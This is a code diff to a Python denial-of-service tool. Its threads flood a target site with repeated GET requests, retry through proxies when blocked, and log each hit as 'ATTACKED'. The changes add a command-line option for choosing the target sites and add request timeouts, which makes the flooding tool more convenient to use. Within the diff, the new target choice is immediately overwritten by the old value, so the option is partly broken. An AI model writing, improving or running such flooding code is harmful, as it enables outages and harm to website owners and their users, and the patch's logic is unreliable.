@@ -39,6 +39,8 @@ parser = ArgumentParser()
 parser.add_argument('threads', nargs='?', default=500)
 parser.add_argument("-n", "--no-clear", dest="no_clear", action='store_true')
 parser.add_argument("-p", "--proxy-view", dest="proxy_view", action='store_true')
+parser.add_argument("-t", "--targets", dest="targets", nargs='+', default=[])
+parser.set_defaults(verbose=False)
 parser.add_argument("-lo", "--logger-output", dest="logger_output")
 parser.add_argument("-lr", "--logger-results", dest="logger_results")
 parser.set_defaults(no_clear=False)
@@ -48,6 +50,8 @@ parser.set_defaults(logger_results=stderr)
 args, unknown = parser.parse_known_args()
 no_clear = args.no_clear
 proxy_view = args.proxy_view
+
+targets = args.targets
 threads = int(args.threads)
 
 logger.remove()
@@ -60,7 +64,6 @@ logger.add(
     format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
         <cyan>{line}</cyan> - <white>{message}</white>",
     level="SUCCESS")
-
 
 def checkReq():
     os.system("python3 -m pip install -r requirements.txt")
@@ -122,6 +125,9 @@ def mainth():
         else:
             sleep(5)
             continue
+
+        site = unquote(choice(targets) if targets else data['site']['page'])
+        logger.info("STARTING ATTACK TO " + site)
         logger.info("STARTING ATTACK ON " + data['site']['page'])
         site = unquote(data['site']['page'])
         if site.startswith('http') == False:
@@ -130,7 +136,7 @@ def mainth():
         attacks_number = 0
 
         try:
-            attack = scraper.get(site)
+            attack = scraper.get(site, timeout=10)
 
             if attack.status_code >= 302:
                 for proxy in data['proxy']:
@@ -141,13 +147,13 @@ def mainth():
                     response = scraper.get(site)
                     if response.status_code >= 200 and response.status_code <= 302:
                         for i in range(MAX_REQUESTS):
-                            response = scraper.get(site)
+                            response = scraper.get(site, timeout=10)
                             attacks_number += 1
                             logger.info("ATTACKED; RESPONSE CODE: " +
                                         str(response.status_code))
             else:
                 for i in range(MAX_REQUESTS):
-                    response = scraper.get(site)
+                    response = scraper.get(site, timeout=10)
                     attacks_number += 1
                     logger.info("ATTACKED; RESPONSE CODE: " +
                                 str(response.status_code))
